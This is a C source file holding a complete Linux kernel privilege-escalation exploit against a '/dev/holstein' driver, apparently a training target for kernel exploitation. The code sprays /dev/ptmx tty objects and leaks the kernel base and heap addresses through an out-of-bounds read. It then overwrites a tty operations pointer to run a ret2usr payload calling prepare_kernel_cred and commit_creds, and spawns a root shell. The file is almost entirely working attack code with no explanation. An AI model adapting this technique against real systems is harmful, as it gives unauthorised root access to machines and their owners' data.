#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
#define ofs_tty_offset 0xc38880
#define spray_num 100
u64 kbase;
u64 g_buf;
void spawn_shell();
u64 user_cs, user_ss, user_rflags, user_sp;
u64 prepare_kernel_cred = 0x74650;
u64 commit_creds = 0x744b0;
u64 user_rip = (u64)spawn_shell + 1;
char buf[0x500];
int global;
void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  system("/bin/sh");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void privesc() {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax;"
          "mov rdi, rax;"
          "movabs rax, commit_creds;"
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;"
          "push r15;"
          "iretq;"
          ".att_syntax;");
}
void open_kn() {
  global = open("/dev/holstein", O_RDWR);
  if (global < 0) {
    puts("[-] cuts");
    exit(-1);
  }
  puts("successfully opened");
}

void close_(int spray[]) {
  for (int i = 0; i < 100; i++) {
    close(spray[i]);
  }
  puts("close ok!!");
}

void write_heap() {
  u64 *p = (u64 *)&buf;
  p[0xc] = (u64)privesc;
  *(u64 *)&buf[0x418] = g_buf;
  write(global, buf, 0x500);
}
void read_dev() {
  read(global, buf, 0x500);
  kbase = *(u64 *)&buf[0x418] - ofs_tty_offset;
  g_buf = *(u64 *)&buf[0x438] - 0x438;
  printf("gbuf: 0x%lx\n", g_buf);
  printf("leaked kbase: 0x%lx\n", kbase);
}
int main() {
  int spray[100];
  save_userland_state();
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  open_kn();
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  read_dev();
  prepare_kernel_cred += kbase;
  commit_creds += kbase;

  u64 *p = (u64 *)&buf;
  p[0xc] = (u64)privesc;
  *(u64 *)&buf[0x418] = g_buf;
  write(global, buf, 0x420);

  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
  }
  getchar();
  close(global);
  close_(spray);
}
